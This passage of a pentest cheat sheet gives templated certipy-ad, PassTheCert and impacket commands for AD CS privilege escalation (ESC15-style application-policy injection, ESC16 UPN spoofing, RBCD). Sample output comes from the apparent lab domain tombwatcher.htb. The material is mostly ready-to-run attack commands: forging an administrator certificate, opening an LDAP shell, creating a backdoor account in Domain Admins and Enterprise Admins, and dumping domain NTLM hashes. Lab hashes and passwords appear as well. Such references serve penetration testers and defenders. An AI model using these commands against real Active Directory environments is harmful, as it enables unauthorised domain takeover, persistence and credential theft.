    whenChanged                         : 2025-10-31T14:47:11+00:00
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad account -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target '<DC>' -dc-host <DC> -dc-ip <DC_IP> -user 'administrator' read
```

```console {class="sample-code"}
$ certipy-ad account -u 'cert_admin@tombwatcher.htb' -hashes '2b576acbe6bcfda7294d6bd18041b8fe' -k -target 'DC01.tombwatcher.htb' -dc-host DC01.tombwatcher.htb -dc-ip 10.129.31.255 -user 'cert_admin' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Reading attributes for 'cert_admin':
    cn                                  : cert_admin.2
    distinguishedName                   : CN=cert_admin.2,OU=ADCS,DC=tombwatcher,DC=htb
    name                                : cert_admin.2
    objectSid                           : S-1-5-21-1392491010-1358638721-2126982587-1111
    sAMAccountName                      : cert_admin
    userAccountControl                  : 66048
    whenCreated                         : 2024-11-16T17:07:04+00:00
    whenChanged                         : 2025-10-31T14:47:11+00:00
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad account -u '<USER>@<DOMAIN>' -k -target '<DC>' -dc-host <DC> -dc-ip <DC_IP> -user 'administrator' read
```

```console {class="sample-code"}
$ certipy-ad account -u 'cert_admin@tombwatcher.htb' -k -target 'DC01.tombwatcher.htb' -dc-host DC01.tombwatcher.htb -dc-ip 10.129.31.255 -user 'cert_admin' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'cert_admin':
    cn                                  : cert_admin.2
    distinguishedName                   : CN=cert_admin.2,OU=ADCS,DC=tombwatcher,DC=htb
    name                                : cert_admin.2
    objectSid                           : S-1-5-21-1392491010-1358638721-2126982587-1111
    sAMAccountName                      : cert_admin
    userAccountControl                  : 66048
    whenCreated                         : 2024-11-16T17:07:04+00:00
    whenChanged                         : 2025-10-31T14:47:11+00:00
```

#### 2. Inject "Client Authentication" Application Policy and Target UPN

```console {class="password"}
# Password
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template 'WebServer' -upn 'administrator@<DOMAIN>' -sid '<SID>' -application-policies 'Client Authentication'
```

```console {class="sample-code"}
$ certipy-ad req -u 'cert_admin' -p 'Password123!' -target DC01.tombwatcher.htb -dc-ip 10.129.31.255 -ca tombwatcher-CA-1 -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 11
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ntlm"}
# NTLM
certipy-ad req -u '<USER>' -hashes '<HASH>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template 'WebServer' -upn 'administrator@<DOMAIN>' -sid '<SID>' -application-policies 'Client Authentication'
```

```console {class="sample-code"}
$ certipy-ad req -u 'cert_admin' -hashes '2b576acbe6bcfda7294d6bd18041b8fe' -target DC01.tombwatcher.htb -dc-ip 10.129.31.255 -ca tombwatcher-CA-1 -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-1111' -application-policies 'Client Authentication'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 12
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template 'WebServer' -upn 'administrator@<DOMAIN>' -sid '<SID>' -application-policies 'Client Authentication'
```

```console {class="sample-code"}
$ certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -k -target DC01.tombwatcher.htb -dc-ip 10.129.31.255 -dc-host DC01.tombwatcher.htb -ns 10.129.31.255 -ca tombwatcher-CA-1 -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-1111' -application-policies 'Client Authentication'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template 'WebServer' -upn 'administrator@<DOMAIN>' -sid '<SID>' -application-policies 'Client Authentication'
```

```console {class="sample-code"}
$ certipy-ad req -u 'cert_admin@tombwatcher.htb' -hashes '2b576acbe6bcfda7294d6bd18041b8fe' -k -target DC01.tombwatcher.htb -dc-ip 10.129.31.255 -dc-host DC01.tombwatcher.htb -ns 10.129.31.255 -ca tombwatcher-CA-1 -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-1111' -application-policies 'Client Authentication'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template 'WebServer' -upn 'administrator@<DOMAIN>' -sid '<SID>' -application-policies 'Client Authentication'
```

```console {class="sample-code"}
$ certipy-ad req -u 'cert_admin@tombwatcher.htb' -k -target DC01.tombwatcher.htb -dc-ip 10.129.31.255 -dc-host DC01.tombwatcher.htb -ns 10.129.31.255 -ca tombwatcher-CA-1 -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-1111' -application-policies 'Client Authentication'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```

#### 3. Spawn LDAP Shell

```console
certipy-ad auth -pfx 'administrator.pfx' -domain <DOMAIN> -dc-ip <DC_IP> -ldap-shell
```

```console {class="sample-code"}
$ certipy-ad auth -pfx 'administrator.pfx' -domain tombwatcher.htb -dc-ip 10.129.31.255 -ldap-shell
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*]     SAN URL SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Connecting to 'ldaps://10.129.31.255:636'
[*] Authenticated to '10.129.31.255' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

#
```

#### 4. Persistence

```console
# Add New User
add_user <NEW_USER>
```

```console {class="sample-code"}
# add_user attacker
Attempting to create user in: %s CN=Users,DC=tombwatcher,DC=htb
Adding new user with username: attacker and password: bY>$f0+G8{IDuG> result: OK
```

```console
# Add New User to Group
add_user_to_group <NEW_USER> Administrators
```

```console {class="sample-code"}
# add_user_to_group attacker Administrators
Adding user: attacker to group Administrators result: OK
```

```console
# Add New User to Group
add_user_to_group <NEW_USER> 'Domain Admins'
```

```console {class="sample-code"}
# add_user_to_group attacker 'Domain Admins'
Adding user: attacker to group Domain Admins result: OK
```

```console
# Add New User to Group
add_user_to_group <NEW_USER> 'Enterprise Admins'
```

```console {class="sample-code"}
# add_user_to_group attacker 'Enterprise Admins'
Adding user: attacker to group Enterprise Admins result: OK
```

```console
# Add RDP
add_user_to_group <NEW_USER> 'Remote Desktop Users'
```

```console {class="sample-code"}
# add_user_to_group attacker 'Remote Desktop Users'
Adding user: attacker to group Remote Desktop Users result: OK
```

```console
# Add Winrm
add_user_to_group <NEW_USER> 'Remote Management Users'
```

```console {class="sample-code"}
# add_user_to_group attacker 'Remote Management Users'
Adding user: attacker to group Remote Management Users result: OK
```

{{< /tabcontent >}}

---

### ESC16: Security Extension Disabled on CA (Globally)

{{< tab set18 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set18 tab1 >}}

#### 1. Read Initial UPN of the Victim Account \[Optional\]

```console {class="password"}
# Password
certipy-ad account -u '<USER>' -p '<PASSWORD>' -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' read
```

```console {class="ntlm"}
# NTLM
certipy-ad account -u '<USER>' -hashes '<HASH>' -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' read
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target '<DC>' -dc-host <DC> -dc-ip <DC_IP> -user '<TARGET_USER>' read
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad account -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target '<DC>' -dc-host <DC> -dc-ip <DC_IP> -user '<TARGET_USER>' read
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad account -u '<USER>@<DOMAIN>' -k -target '<DC>' -dc-host <DC> -dc-ip <DC_IP> -user '<TARGET_USER>' read
```

#### 2. Modify Target User's userPrincipalName (With GenericAll/GenericWrite)

```console {class="password"}
# Password
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -user <TARGET_USER> -upn 'administrator'
```

```console {class="ntlm"}
# NTLM
certipy-ad account update -u '<USER>@<DOMAIN>' -hashes <HASH> -user <TARGET_USER> -upn 'administrator'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -dc-host <DC> -ns <DC_IP> -user <TARGET_USER> -upn 'administrator'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -hashes <HASH> -k -dc-host <DC> -ns <DC_IP> -user <TARGET_USER> -upn 'administrator'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -k -dc-host <DC> -ns <DC_IP> -user <TARGET_USER> -upn 'administrator'
```

#### 3. Request a Cert as the Victim from Any Suitable Client Authentication Template

```console {class="password"}
# Password
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template 'User'
```

```console {class="ntlm"}
# NTLM
certipy-ad req -u '<USER>' -hashes '<HASH>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template 'User'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template 'User'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template 'User'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template 'User'
```

#### 4. Revert

```console {class="password"}
# Password
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -user <TARGET_USER> -upn '<TARGET_USER_UPN>'
```

```console {class="ntlm"}
# NTLM
certipy-ad account update -u '<USER>@<DOMAIN>' -hashes <HASH> -user <TARGET_USER> -upn '<TARGET_USER_UPN>'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -dc-host <DC> -ns <DC_IP> -user <TARGET_USER> -upn '<TARGET_USER_UPN>'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -hashes <HASH> -k -dc-host <DC> -ns <DC_IP> -user <TARGET_USER> -upn '<TARGET_USER_UPN>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad account update -u '<USER>@<DOMAIN>' -k -dc-host <DC> -ns <DC_IP> -user <TARGET_USER> -upn '<TARGET_USER_UPN>'
```

#### 5. Get NTLM Hash

```console
certipy-ad auth -pfx administrator.pfx -u 'administrator' -domain <DOMAIN> -dc-ip <DC_IP>
```

{{< /tabcontent >}}

---

### Workaround: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP

#### 1. Create Key and Cert from pfx

```console
certipy-ad cert -pfx '<USER>.pfx' -nocert -out '<USER>.key'
```

```console
certipy-ad cert -pfx '<USER>.pfx' -nokey -out '<USER>.crt'
```

{{< tab set19 tab1 >}}LDAP Shell{{< /tab >}}
{{< tab set19 tab2 >}}RBCD{{< /tab >}}
{{< tabcontent set19 tab1 >}}

#### 1. Get a LDAP Shell

```console
python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt '<USER>.crt' -key '<USER>.key' -domain <DOMAIN> -dc-ip <DC>
```

#### 2. Add User to Administrators Group

```console
add_user_to_group '<USER>' administrators
```

#### 3. Remote

```console {class="password"}
# Password
evil-winrm -i <TARGET> -u '<USER>' -p '<PASSWORD>'
```

<small>*Ref: [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)*</small>

{{< /tabcontent >}}
{{< tabcontent set19 tab2 >}}

#### 1. RBCD Attack

```console
python3 PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'Evil_Computer$' -crt administrator.crt -key administrator.key -domain <DOMAIN> -dc-ip <DC>
```

#### 2. Request a Service Ticket

```console
# Password
sudo ntpdate -s <DC_IP> && python3 impacket-getST -spn 'cifs/<TARGET>' -impersonate Administrator '<DOMAIN>/Evil_Computer$:<GENERATED_PASSWORD>'
```

#### 3. Secrets Dump

```console
# Pass-the-ticket
export KRB5CCNAME=Administrator.ccache
```

```console
# Ticket-based Kerberos
impacket-secretsdump '<DOMAIN>/administrator@<TARGET>' -k -no-pass -just-dc-ntlm
```

<small>*Ref: [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)*</small>

{{< /tabcontent >}}